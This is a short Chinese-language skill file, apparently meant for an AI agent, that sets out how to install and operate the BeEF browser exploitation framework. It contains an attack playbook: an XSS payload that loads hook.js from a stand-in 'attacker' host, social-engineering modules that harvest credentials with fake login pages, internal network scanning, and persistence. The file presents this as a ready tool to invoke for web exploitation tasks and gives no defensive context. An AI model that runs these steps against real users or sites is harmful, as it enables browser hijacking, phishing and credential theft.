---
name: beef-browser-hook
description: 渗透工具 skill:BeEF 的安装、参数速查与攻击场景 playbook。当任务涉及 Web应用漏洞利用 需要调用 BeEF 时使用。
---

# BeEF

- 攻击大类:C09 Web应用漏洞利用
- 上游仓库:https://github.com/beefproject/beef
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/beefproject/beef && cd beef && ./install
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./beef` | 启动控制面板(:3000) |
| `hook.js 投递` | XSS payload 指向 http://attacker:3000/hook.js |
| `社会工程模块` | 钓鱼弹窗/假登录页 |
| `网络模块` | 扫描目标内网 |
| `持久化模块` | 确认框驻留 |

## 攻击场景 Playbook

### 浏览器僵尸化

```bash
./beef  # 投递 hook.js 到目标
# UI 里 modules → 选 Social Engineering 模块收集凭据/挂 fake login
```

## 注意事项

浏览器端利用框架:hook 后 300+ 模块(社工/内网探测/持久化);配 XSS 打点闭环。
